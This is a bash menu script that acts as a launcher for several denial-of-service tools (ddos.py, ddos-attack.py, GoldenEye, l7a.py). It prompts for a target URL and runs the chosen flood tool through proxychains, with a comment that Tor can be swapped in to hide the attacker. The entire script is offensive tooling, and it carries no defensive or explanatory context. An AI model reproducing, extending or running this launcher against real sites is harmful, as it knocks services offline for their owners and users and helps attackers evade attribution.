#!/bin/bash
# Bash Menu Script Example
#./menu.sh
#
default_uri="https://site.com"
#
read -e -p "Enter Special Args " -i "proxychains" specarg # Can change to tor!
PS3='Please enter your choice: '
options=("Set Target" "ddos v1" "ddos v2" "Goldeneye" "l7a" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Set Target")
            echo "You chose Set Target"
            read -e -p "Set Target " -i "$default_uri" target
          #  break
            ;;
        "ddos v1")
            echo "You chose ddos v1"
            $specarg ./ddos.py $target
            ;;
        "ddos v2")
            echo "You chose ddos v2"
            $specarg ./ddos-attack.py $target
            ;;
        "Goldeneye")
            echo "You chose Goldeneye"
            cd GoldenEye
            $specarg ./goldeneye.py $target
            ;;
        "l7a")
            echo "You chose l7a"
            $specarg ./l7a.py -s $target
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done

